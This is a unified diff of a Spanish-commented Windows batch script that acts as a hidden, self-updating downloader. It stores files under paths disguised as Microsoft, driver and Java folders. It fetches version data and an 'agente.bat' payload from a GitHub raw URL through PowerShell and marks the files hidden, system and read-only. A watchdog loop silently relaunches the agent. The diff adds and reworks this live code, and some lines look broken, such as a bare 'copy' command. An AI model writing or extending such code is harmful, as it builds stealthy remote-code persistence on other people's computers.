@@ -8,6 +8,8 @@ set "AGENTE_DIR=%AppData%\Microsoft\Vault"
 set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
 set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
 set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
+set "VLINEA=%temp%\vl_data.log"
+set "MEM_DIR=%VERSION_DIR%"
 
 :: URLs de GitHub
 set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
@@ -16,15 +18,40 @@ set "URL_AGENTE=%URL_BASE%/agente.bat"
 
 :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
 :: Intentamos bajar la versión de la nube a un temporal
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VERSION_DIR%\v_data.log')" >nul 2>&1
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1
+
+::
+::
+:: Si el archivo está vacío o no se descargó, morimos
+if not exist "%VLINEA%" exit
+for %%i in ("%VLINEA%") do if %%~zi == 0 (del "%VLINEA%" & exit)
+
+set /p LINEA_NUBE=<"%VLINEA%"
+:: 2. Comprobar si existe el archivo de memoria local
+if exist "%VERSION_LOCAL%" (
+    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
+) else (
+    copy "%VLINEA%" "%MEM_DIR%" >nul 2>&1
+    set "LINEA_LOCAL=0"
+) 
+if "!LINEA_LOCAL!"=="!LINEA_NUBE!" (
+    del "%VLINEA%"
+    exit
+) else (
+    copy "%VLINEA%" "%MEM_DIR%" >nul 2>&1
+    del "%VLINEA%" 
+)
+
+::
+::
 
 if exist "%VERSION_DIR%\v_data.log" (
     set /p VERSION_NUBE= < "%VERSION_DIR%\v_data.log"
-    del /f /q "%VERSION_DIR%\v_data.log" >nul 2>&1
     
-
     :: LIMPIEZA DE FORMATO: Quitamos espacios vacíos que GitHub a veces añade
     set "VERSION_NUBE=!VERSION_NUBE: =!"
+    
+
     
     :: Si la nube tiene una versión superior, descargamos el nuevo Agente
     if !VERSION_NUBE! GTR %VERSION_LOCAL% (
@@ -42,6 +69,7 @@ if exist "%VERSION_DIR%\v_data.log" (
         attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
         attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
     )
+    copy 
 )
 
 :BUCLE_VIGILANCIA
@@ -61,11 +89,6 @@ if not exist "%AGENTE_FILE%" (
     attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
 )
 
-:: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
-tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
-if %errorlevel% neq 0 (
-    start /b "" cmd /c "%AGENTE_FILE%"
-)
 :: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
 tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
 if %errorlevel% neq 0 (
